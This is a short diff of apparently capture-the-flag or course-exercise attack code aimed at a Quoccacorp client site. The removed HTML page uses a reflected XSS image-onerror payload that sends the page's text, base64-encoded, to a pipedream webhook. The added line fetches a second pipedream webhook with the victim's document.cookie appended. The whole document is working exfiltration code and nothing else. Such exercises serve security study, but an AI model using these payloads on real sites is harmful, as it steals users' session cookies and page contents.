@@ -1,12 +1,1 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        const WEBHOOK = "https://eohlv7w2ec4l19w.m.pipedream.net";
-        // 改用 location.replace 減少跳轉紀錄，並使用更短的 Payload
-        // 我們直接把 document.body.innerText 傳出去，這通常就包含 Flag 了
-        const payload = `<img src=x onerror="location.href='${WEBHOOK}?f='+btoa(document.body.innerText)">`;
-        window.location.href = "https://clients.quoccacorp.com/?q=" + encodeURIComponent(payload);
-    </script>
-</body>
-</html>
+fetch('https://eobu0wjj3ln3nn0.m.pipedream.net?c='+document.cookie)
